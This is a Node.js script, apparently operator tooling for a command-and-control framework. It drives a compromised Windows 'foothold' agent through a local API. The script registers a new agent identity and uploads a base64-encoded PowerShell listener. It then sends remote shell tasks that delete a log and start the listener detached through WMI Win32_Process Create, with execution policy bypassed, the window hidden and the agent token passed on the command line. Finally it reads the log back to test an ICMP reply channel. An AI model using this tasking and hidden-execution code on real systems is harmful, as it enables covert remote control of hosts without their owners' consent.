// probe-listen2.mjs <footholdId> — drive guest-icmp-listen2.ps1: fresh identity,
// WMI-detached self-logging run (echo probe + governed pull + 15s frame dump),
// then read the log. Wire-vs-agent split for the reply path.
const API = 'http://127.0.0.1:8971';
const FOOTHOLD = process.argv[2];
if (!FOOTHOLD) { console.error('usage: node probe-listen2.mjs <footholdId>'); process.exit(2); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const { readFileSync } = await import('node:fs');

async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 40) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}

const reg = await j('/api/channel/agent', { action: 'register', label: 'listen2-probe' });
console.log('probe identity:', reg.agentId);
const b64 = readFileSync(new URL('./guest-icmp-listen2.ps1', import.meta.url)).toString('base64');
const st = await j('/api/channel/stage', { agentId: FOOTHOLD, name: 'guest-icmp-listen2.ps1', b64 });
console.log('staged:', await waitTask(FOOTHOLD, st.taskId, 30));

await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'del C:\\Windows\\Temp\\icmp-listen2.log' });
await sleep(3000);
const wmi = "powershell -NoProfile -Command $r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\agentbox\\guest-icmp-listen2.ps1 -AgentId " + reg.agentId + " -Token " + reg.token + "'}; $r.ReturnValue";
const lt = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: wmi });
console.log('launch:', await waitTask(FOOTHOLD, lt.taskId, 30));

await sleep(24000); // probe + 15s listen + margin
const t2 = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'type C:\\Windows\\Temp\\icmp-listen2.log' });
console.log('LISTEN2 LOG:', JSON.stringify(await waitTask(FOOTHOLD, t2.taskId, 40)));
